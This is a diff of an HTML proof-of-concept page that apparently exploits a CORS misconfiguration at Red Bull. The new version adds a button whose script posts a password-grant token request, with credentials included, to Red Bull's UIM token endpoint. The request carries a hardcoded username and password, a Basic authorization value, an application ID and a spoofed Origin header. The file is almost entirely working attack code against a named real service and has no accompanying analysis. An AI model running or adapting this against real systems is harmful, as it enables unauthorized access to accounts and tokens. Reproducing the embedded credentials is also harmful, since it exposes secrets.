@@ -1,29 +1,51 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Red Bull CORS Misconfiguration PoC</title>
+  <title>Red Bull CORS PoC</title>
 </head>
 <body>
-  <h2>Red Bull CORS Exploitation PoC</h2>
-  <pre id="output">Loading...</pre>
+  <h2>Red Bull CORS Misconfiguration PoC</h2>
+  <button onclick="exploit()">Exploit CORS</button>
+  <pre id="output" style="white-space: pre-wrap; margin-top: 20px;"></pre>
 
   <script>
-    fetch("https://graphql-proxy.redbull.com/account/resources/en-IN", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        ids: ["rrn:content:shows:eb17e649-80ed-53d9-8e33-f323efbd85ff"]
+    function exploit() {
+      const data = new URLSearchParams({
+        grant_type: 'password',
+        scope: 'openid profile',
+        username: 'tibim36479@nab4.com',
+        password: 'Securepassword@10',
+        nonce: 'ce572b097b4f32fbebe4c6d657c92ac215d28d9d2bf6610e1a901abcad282d32'
+      });
+
+      fetch('https://uim.redbull.com/uim/api/token', {
+        method: 'POST',
+        mode: 'cors',
+        credentials: 'include',
+        headers: {
+          'Origin': 'https://evil.redbull.com',
+          'Authorization': 'Basic NWIyY2UzMGJkOWEwYmYyODVhYzcwYzEwOm5vc2VjcmV0YXZhaWxhYmxl',
+          'X-Uim-Authorization': 'Basic NWIyY2UzMGJkOWEwYmYyODVhYzcwYzEwOm5vc2VjcmV0YXZhaWxhYmxl',
+          'X-Uim-Sdk-Version': '6.1.0',
+          'Application-Id': '5b2ce30bd9a0bf285ac70c10',
+          'Content-Type': 'application/x-www-form-urlencoded',
+          'Uim-Country': 'IN',
+          'Uim-Language': 'en',
+          'Uim-Fallback-Language': 'en',
+          'Uim-I18n-Namespace': 'main',
+          'Uim-I18n-Fallback-Namespace': 'main',
+          'X-Uim-Correlationid': '8f822390-06a3-41ca-8cff-d6f8d2d3adda'
+        },
+        body: data.toString()
       })
-    })
-    .then(response => response.json())
-    .then(data => {
-      document.getElementById("output").textContent = JSON.stringify(data, null, 2);
-    })
-    .catch(err => {
-      document.getElementById("output").textContent = "Error: " + err;
-    });
+      .then(response => response.text())
+      .then(text => {
+        document.getElementById('output').textContent = text;
+      })
+      .catch(error => {
+        document.getElementById('output').textContent = 'Error: ' + error;
+      });
+    }
   </script>
 </body>
 </html>
